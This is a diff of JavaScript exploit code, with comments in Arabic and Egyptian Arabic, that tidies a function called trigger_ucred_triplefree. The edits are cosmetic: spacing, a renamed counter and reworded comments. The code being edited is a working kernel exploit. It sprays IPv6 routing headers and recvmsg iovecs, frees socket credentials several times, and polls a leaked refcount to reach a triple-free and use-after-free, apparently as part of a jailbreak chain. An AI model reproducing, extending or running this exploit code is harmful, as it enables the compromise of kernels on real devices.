@@ -1298,17 +1298,16 @@ function remove_uaf_file() {
     }
   }
 }
+// ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 2000;
-
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
 function trigger_ucred_triplefree() {
-  var end        = false;
-  var main_count = 0;
+  var end = false;
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
-
+  var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
@@ -1331,7 +1330,7 @@ function trigger_ucred_triplefree() {
     write32(nc_clear_buf, uaf_socket);
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
-    // 6) محاولة تهدئة/refcount fix خفيفة
+    // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
@@ -1350,13 +1349,12 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
     // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
-    var wait_count = 0;
-    while (wait_count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+    var count = 0;
+    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       // شغّل recvmsg
       trigger_iov_recvmsg();
 
@@ -1365,22 +1363,19 @@ function trigger_ucred_triplefree() {
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
-      // دلوقتي بس نقرأ refcount (عند +0x04 زي باقي الدوال)
+      // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
       if (read32(leak_rthdr.add(0x04)) === 1) break;
-
-      wait_count++;
+      count++;
     }
-
-    if (wait_count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
     }
-
     triplets[0] = twins[0];
 
     // 11) triple free فعليًا
@@ -1407,11 +1402,9 @@ function trigger_ucred_triplefree() {
       end = false;
       continue;
     }
-
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
-
   if (main_count === TRIPLEFREE_ITERATIONS) {
     return false;
   }
